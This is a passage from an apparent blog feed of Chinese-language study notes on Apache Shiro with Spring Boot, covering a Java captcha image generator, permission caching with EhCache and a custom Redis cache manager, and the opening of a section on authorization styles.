200)</span>);<span class="comment">// 设置线条的颜色</span></span><br><span class="line">        for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">int</span> x = random.next<span class="constructor">Int(<span class="params">w</span> - 1)</span>;</span><br><span class="line">            <span class="built_in">int</span> y = random.next<span class="constructor">Int(<span class="params">h</span> - 1)</span>;</span><br><span class="line">            <span class="built_in">int</span> xl = random.next<span class="constructor">Int(6)</span> + <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">int</span> yl = random.next<span class="constructor">Int(12)</span> + <span class="number">1</span>;</span><br><span class="line">            g2.draw<span class="constructor">Line(<span class="params">x</span>, <span class="params">y</span>, <span class="params">x</span> + <span class="params">xl</span> + 40, <span class="params">y</span> + <span class="params">yl</span> + 20)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加噪点</span></span><br><span class="line">        <span class="built_in">float</span> yawpRate = <span class="number">0.05</span>f;<span class="comment">// 噪声率</span></span><br><span class="line">        <span class="built_in">int</span> area = (<span class="built_in">int</span>) (yawpRate<span class="operator"> * </span>w<span class="operator"> * </span>h);</span><br><span class="line">        for (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; area; i++) &#123;</span><br><span class="line">            <span class="built_in">int</span> x = random.next<span class="constructor">Int(<span class="params">w</span>)</span>;</span><br><span class="line">            <span class="built_in">int</span> y = random.next<span class="constructor">Int(<span class="params">h</span>)</span>;</span><br><span class="line">            <span class="built_in">int</span> rgb = get<span class="constructor">RandomIntColor()</span>;</span><br><span class="line">            image.set<span class="constructor">RGB(<span class="params">x</span>, <span class="params">y</span>, <span class="params">rgb</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        shear(g2, w, h, c);<span class="comment">// 使图片扭曲</span></span><br><span class="line"></span><br><span class="line">        g2.set<span class="constructor">Color(<span class="params">getRandColor</span>(100, 160)</span>);</span><br><span class="line">        <span class="built_in">int</span> fontSize = h-<span class="number">4</span>;</span><br><span class="line">        Font font = <span class="keyword">new</span> <span class="constructor">Font(<span class="string">"Algerian"</span>, Font.ITALIC, <span class="params">fontSize</span>)</span>;</span><br><span class="line">        g2.set<span class="constructor">Font(<span class="params">font</span>)</span>;</span><br><span class="line">        <span class="built_in">char</span><span class="literal">[]</span> chars = code.<span class="keyword">to</span><span class="constructor">CharArray()</span>;</span><br><span class="line">        for(<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; verifySize; i++)&#123;</span><br><span class="line">            AffineTransform affine = <span class="keyword">new</span> <span class="constructor">AffineTransform()</span>;</span><br><span class="line">            affine.set<span class="constructor">ToRotation(Math.PI <span class="operator">/</span> 4 <span class="operator">*</span> <span class="params">rand</span>.<span class="params">nextDouble</span>()</span><span class="operator"> * </span>(rand.next<span class="constructor">Boolean()</span> ? <span class="number">1</span> : -<span class="number">1</span>), (w<span class="operator"> / </span>verifySize)<span class="operator"> * </span>i + fontSize/<span class="number">2</span>, h/<span class="number">2</span>);</span><br><span class="line">            g2.set<span class="constructor">Transform(<span class="params">affine</span>)</span>;</span><br><span class="line">            g2.draw<span class="constructor">Chars(<span class="params">chars</span>, <span class="params">i</span>, 1, ((<span class="params">w</span>-10)</span><span class="operator"> / </span>verifySize)<span class="operator"> * </span>i + <span class="number">5</span>, h/<span class="number">2</span> + fontSize/<span class="number">2</span> - <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        g2.dispose<span class="literal">()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">ImageIO</span>.</span></span>write(image, <span class="string">"jpg"</span>, os);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> static Color get<span class="constructor">RandColor(<span class="params">int</span> <span class="params">fc</span>, <span class="params">int</span> <span class="params">bc</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (fc &gt; <span class="number">255</span>)</span><br><span class="line">            fc = <span class="number">255</span>;</span><br><span class="line">        <span class="keyword">if</span> (bc &gt; <span class="number">255</span>)</span><br><span class="line">            bc = <span class="number">255</span>;</span><br><span class="line">        <span class="built_in">int</span> r = fc + random.next<span class="constructor">Int(<span class="params">bc</span> - <span class="params">fc</span>)</span>;</span><br><span class="line">        <span class="built_in">int</span> g = fc + random.next<span class="constructor">Int(<span class="params">bc</span> - <span class="params">fc</span>)</span>;</span><br><span class="line">        <span class="built_in">int</span> b = fc + random.next<span class="constructor">Int(<span class="params">bc</span> - <span class="params">fc</span>)</span>;</span><br><span class="line">        return <span class="keyword">new</span> <span class="constructor">Color(<span class="params">r</span>, <span class="params">g</span>, <span class="params">b</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> static <span class="built_in">int</span> get<span class="constructor">RandomIntColor()</span> &#123;</span><br><span class="line">        <span class="built_in">int</span><span class="literal">[]</span> rgb = get<span class="constructor">RandomRgb()</span>;</span><br><span class="line">        <span class="built_in">int</span> color = <span class="number">0</span>;</span><br><span class="line">        for (<span class="built_in">int</span> c : rgb) &#123;</span><br><span class="line">            color = color &lt;&lt; <span class="number">8</span>;</span><br><span class="line">            color = color <span class="pattern-match">| c;</span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match">        return color;</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static <span class="built_in">int</span>[] get<span class="constructor">RandomRgb()</span> &#123;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span>[] rgb = <span class="keyword">new</span> <span class="built_in">int</span>[3];</span></span><br><span class="line"><span class="pattern-match">        for (<span class="built_in">int</span> i = 0; i &lt; 3; i<span class="operator">++</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">            rgb[i] = random.next<span class="constructor">Int(255)</span>;</span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match">        return rgb;</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static void shear(<span class="constructor">Graphics</span> g, <span class="built_in">int</span> w1, <span class="built_in">int</span> h1, <span class="constructor">Color</span> color) &#123;</span></span><br><span class="line"><span class="pattern-match">        shear<span class="constructor">X(<span class="params">g</span>, <span class="params">w1</span>, <span class="params">h1</span>, <span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">        shear<span class="constructor">Y(<span class="params">g</span>, <span class="params">w1</span>, <span class="params">h1</span>, <span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static void shear<span class="constructor">X(Graphics <span class="params">g</span>, <span class="params">int</span> <span class="params">w1</span>, <span class="params">int</span> <span class="params">h1</span>, Color <span class="params">color</span>)</span> &#123;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> period = random.next<span class="constructor">Int(2)</span>;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        boolean border<span class="constructor">Gap</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> frames = 1;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> phase = random.next<span class="constructor">Int(2)</span>;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        for (<span class="built_in">int</span> i = 0; i &lt; h1; i<span class="operator">++</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">            double d = (double) (period &gt;&gt; 1)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">*</span> <span class="constructor">Math</span>.sin((double) i <span class="operator">/</span> (double) period</span></span><br><span class="line"><span class="pattern-match">                    + (6.2831853071795862<span class="constructor">D</span> <span class="operator">*</span> (double) phase)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">/</span> (double) frames);</span></span><br><span class="line"><span class="pattern-match">            g.copy<span class="constructor">Area(0, <span class="params">i</span>, <span class="params">w1</span>, 1, (<span class="params">int</span>)</span> d, 0);</span></span><br><span class="line"><span class="pattern-match">            <span class="keyword">if</span> (border<span class="constructor">Gap</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">                g.set<span class="constructor">Color(<span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line((<span class="params">int</span>)</span> d, i, 0, i);</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line((<span class="params">int</span>)</span> d + w1, i, w1, i);</span></span><br><span class="line"><span class="pattern-match">            &#125;</span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    <span class="keyword">private</span> static void shear<span class="constructor">Y(Graphics <span class="params">g</span>, <span class="params">int</span> <span class="params">w1</span>, <span class="params">int</span> <span class="params">h1</span>, Color <span class="params">color</span>)</span> &#123;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> period = random.next<span class="constructor">Int(40)</span> + 10; <span class="operator">/</span><span class="operator">/</span> 50;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        boolean border<span class="constructor">Gap</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> frames = 20;</span></span><br><span class="line"><span class="pattern-match">        <span class="built_in">int</span> phase = 7;</span></span><br><span class="line"><span class="pattern-match">        for (<span class="built_in">int</span> i = 0; i &lt; w1; i<span class="operator">++</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">            double d = (double) (period &gt;&gt; 1)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">*</span> <span class="constructor">Math</span>.sin((double) i <span class="operator">/</span> (double) period</span></span><br><span class="line"><span class="pattern-match">                    + (6.2831853071795862<span class="constructor">D</span> <span class="operator">*</span> (double) phase)</span></span><br><span class="line"><span class="pattern-match">                    <span class="operator">/</span> (double) frames);</span></span><br><span class="line"><span class="pattern-match">            g.copy<span class="constructor">Area(<span class="params">i</span>, 0, 1, <span class="params">h1</span>, 0, (<span class="params">int</span>)</span> d);</span></span><br><span class="line"><span class="pattern-match">            <span class="keyword">if</span> (border<span class="constructor">Gap</span>) &#123;</span></span><br><span class="line"><span class="pattern-match">                g.set<span class="constructor">Color(<span class="params">color</span>)</span>;</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line(<span class="params">i</span>, (<span class="params">int</span>)</span> d, i, 0);</span></span><br><span class="line"><span class="pattern-match">                g.draw<span class="constructor">Line(<span class="params">i</span>, (<span class="params">int</span>)</span> d + h1, i, h1);</span></span><br><span class="line"><span class="pattern-match">            &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">        &#125;</span></span><br><span class="line"><span class="pattern-match"></span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match">    public static void main(<span class="constructor">String</span>[] args) throws <span class="constructor">IOException</span> &#123;</span></span><br><span class="line"><span class="pattern-match">        <span class="operator">/</span><span class="operator">/</span>获取验证码</span></span><br><span class="line"><span class="pattern-match">        <span class="constructor">String</span> s = generate<span class="constructor">VerifyCode(4)</span>;</span></span><br><span class="line"><span class="pattern-match">        <span class="operator">/</span><span class="operator">/</span>将验证码放入图片中</span></span><br><span class="line"><span class="pattern-match">        output<span class="constructor">Image(260,60,<span class="params">new</span> File(<span class="string">"/Users/chenyannan/Desktop/安工资料/aa.jpg"</span>)</span>,s);</span></span><br><span class="line"><span class="pattern-match">        <span class="constructor">System</span>.out.println(s);</span></span><br><span class="line"><span class="pattern-match">    &#125;</span></span><br><span class="line"><span class="pattern-match">&#125;</span></span><br></pre></td></tr></table></figure><br>这样就做好了</p>
<p>到这里shiro就全部结束了 <del>虽然还有一个thymeleaf 但是我不想学了</del></p>
<p><a href="/download/springboot_jsp_shiro.zip">源码下载</a></p>
<p>🌸🌸🌸完结撒花🌸🌸🌸</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/12/9-缓存</title>
    <url>/2020/12/09/Shiro-2020-12-9-EhCache%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h1><p>页面中权限的数据每次访问都会与数据库进行一次交互 这样就导致用户数量多的时候 访问量大的时候  就会导致数据库压力过大</p>
<p>所以为了避免这种问题  就需要给权限的数据加缓存  这样需要权限的时候对于已经授权的用户就不用与数据库交互  直接在缓存中去找对应的权限就好了  可以尽量减轻数据库的压力</p>
<h2 id="CacheManager"><a href="#CacheManager" class="headerlink" title="CacheManager"></a>CacheManager</h2><h3 id="Cache作用"><a href="#Cache作用" class="headerlink" title="Cache作用"></a>Cache作用</h3><ul>
<li><p>Cache缓存：计算机内存中一段数据 内存条</p>
</li>
<li><p>作用：用来减轻DB的访问压力，从而提高系统的查询效率</p>
</li>
<li><p>流程：<br><img src="/img/JavaWeb/12-9学习日记/0.png" alt="avatar"></p>
</li>
</ul>
<p>这里要注意 只有查询次数多并且增删改极少的数据才适合存入缓存中</p>
<h3 id="EhCache实现缓存"><a href="#EhCache实现缓存" class="headerlink" title="EhCache实现缓存"></a>EhCache实现缓存</h3><ol>
<li>引入依赖</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        shiro-ehcache--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-ehcache<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li>开启缓存管理</li>
</ol>
<p>在ShiroConfig中开启缓存管理<br>添加代码<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//开启缓存管理</span></span><br><span class="line">customerRealm.set<span class="constructor">CacheManager(<span class="params">new</span> RedisCacheManager()</span>);</span><br><span class="line">customerRealm.set<span class="constructor">CachingEnabled(<span class="params">true</span>)</span>;<span class="comment">//开启全局缓存</span></span><br><span class="line">customerRealm.set<span class="constructor">AuthenticationCachingEnabled(<span class="params">true</span>)</span>;<span class="comment">//认证认证缓存</span></span><br><span class="line">customerRealm.set<span class="constructor">AuthenticationCacheName(<span class="string">"authenticationCache"</span>)</span>;</span><br><span class="line">customerRealm.set<span class="constructor">AuthorizationCachingEnabled(<span class="params">true</span>)</span>;<span class="comment">//开启授权缓存</span></span><br><span class="line">customerRealm.set<span class="constructor">AuthorizationCacheName(<span class="string">"authorizationCache"</span>)</span>;</span><br></pre></td></tr></table></figure><br>开启之后 只有第一次会操作我们的数据库 之后就不会操作数据库了 因为已经存到了缓存当中<br>但是使用这样的方法会有个缺点，就是如果当服务器断电或宕机时，重新访问依然会操作数据库，所以可以使用Redis来实现一个分布式缓存</p>
<h3 id="Redis实现缓存"><a href="#Redis实现缓存" class="headerlink" title="Redis实现缓存"></a>Redis实现缓存</h3><ol>
<li>引入redis依赖<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--redis整合springboot--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置redis连接<br>注意进行这步之前 需要先安装redis 确保正常运行<br>在application.properties添加<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring.redis.port</span>=<span class="number">6379</span></span><br><span class="line"><span class="attr">spring.redis.host</span>=localhost</span><br><span class="line"><span class="attr">spring.redis.database</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure></li>
<li>自定义缓存管理器</li>
</ol>
<p>先在shiro下创建一个新的包cache<br>新建一个RedisCacheManager.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.Cache;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheManager;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义shiro缓存管理器</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisCacheManager</span> <span class="keyword">implements</span> <span class="title">CacheManager</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//参数1:认证或者是授权缓存的统一名称</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;K, V&gt; <span class="function">Cache&lt;K, V&gt; <span class="title">getCache</span><span class="params">(String cacheName)</span> <span class="keyword">throws</span> CacheException </span>&#123;</span><br><span class="line">        System.out.println(cacheName);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RedisCache&lt;K,V&gt;(cacheName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候就可以修改ShiroConfig的缓存管理器指定我们自定义的Redis管理器<br>ShiroConfig<br><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">customerRealm.setCacheManager(<span class="keyword">new</span> <span class="type">RedisCacheManager</span>());</span><br></pre></td></tr></table></figure><br>再写一个RedisCache.java  这个才是真正实现缓存的操作</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.ApplicationContextUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.Cache;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义redis缓存的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisCache</span>&lt;<span class="type">k,v</span>&gt; <span class="title">implements</span> <span class="title">Cache</span>&lt;<span class="type">k,v</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cacheName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache(String cacheName) &#123;</span><br><span class="line">        <span class="keyword">this</span>.cacheName = cacheName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v <span class="keyword">get</span>(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"get key:"</span>+k);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().<span class="keyword">get</span>(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v put(k k, v v) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put key: "</span>+k);</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put value:"</span>+v);</span><br><span class="line">        getRedisTemplate().opsForHash().put(<span class="keyword">this</span>.cacheName,k.toString(),v);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v remove(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============remove============="</span>);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().delete(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void clear() throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============clear=============="</span>);</span><br><span class="line">        getRedisTemplate().delete(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> int size() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().size(<span class="keyword">this</span>.cacheName).intValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;k&gt; keys() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().keys(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;v&gt; values() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().values(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate getRedisTemplate()&#123;</span><br><span class="line">        RedisTemplate redisTemplate = (RedisTemplate) ApplicationContextUtils.getBean(<span class="string">"redisTemplate"</span>);</span><br><span class="line">        redisTemplate.setKeySerializer(new StringRedisSerializer());</span><br><span class="line">        redisTemplate.setHashKeySerializer(new StringRedisSerializer());</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.cache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.ApplicationContextUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.Cache;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.cache.CacheException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.<span class="keyword">data</span>.redis.serializer.StringRedisSerializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义redis缓存的实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedisCache</span>&lt;<span class="type">k,v</span>&gt; <span class="title">implements</span> <span class="title">Cache</span>&lt;<span class="type">k,v</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String cacheName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> RedisCache(String cacheName) &#123;</span><br><span class="line">        <span class="keyword">this</span>.cacheName = cacheName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v <span class="keyword">get</span>(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"get key:"</span>+k);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().<span class="keyword">get</span>(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v put(k k, v v) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put key: "</span>+k);</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"put value:"</span>+v);</span><br><span class="line">        getRedisTemplate().opsForHash().put(<span class="keyword">this</span>.cacheName,k.toString(),v);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> v remove(k k) throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============remove============="</span>);</span><br><span class="line">        <span class="keyword">return</span> (v) getRedisTemplate().opsForHash().delete(<span class="keyword">this</span>.cacheName,k.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void clear() throws CacheException &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">"=============clear=============="</span>);</span><br><span class="line">        getRedisTemplate().delete(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> int size() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().size(<span class="keyword">this</span>.cacheName).intValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;k&gt; keys() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().keys(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;v&gt; values() &#123;</span><br><span class="line">        <span class="keyword">return</span> getRedisTemplate().opsForHash().values(<span class="keyword">this</span>.cacheName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate getRedisTemplate()&#123;</span><br><span class="line">        RedisTemplate redisTemplate = (RedisTemplate) ApplicationContextUtils.getBean(<span class="string">"redisTemplate"</span>);</span><br><span class="line">        redisTemplate.setKeySerializer(new StringRedisSerializer());</span><br><span class="line">        redisTemplate.setHashKeySerializer(new StringRedisSerializer());</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>Shiro</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro-2020/12/7-授权数据持久化</title>
    <url>/2020/12/07/Shiro-2020-12-7-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h1><h2 id="授权方式"><a href="#授权方式" class="headerlink" title="授权方式"></a>授权方式</h2><ul>
<li><p>编程式</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line"><span class="keyword">if</span>(subject.has<span class="constructor">Role(<span class="string">"admin"</span>)</span>)&#123;</span><br><span class="line">	<span class="comment">//有权限</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//无权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注解式</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequiresRoles</span>(<span class="string">"admin"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//有权限</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>标签式</p>
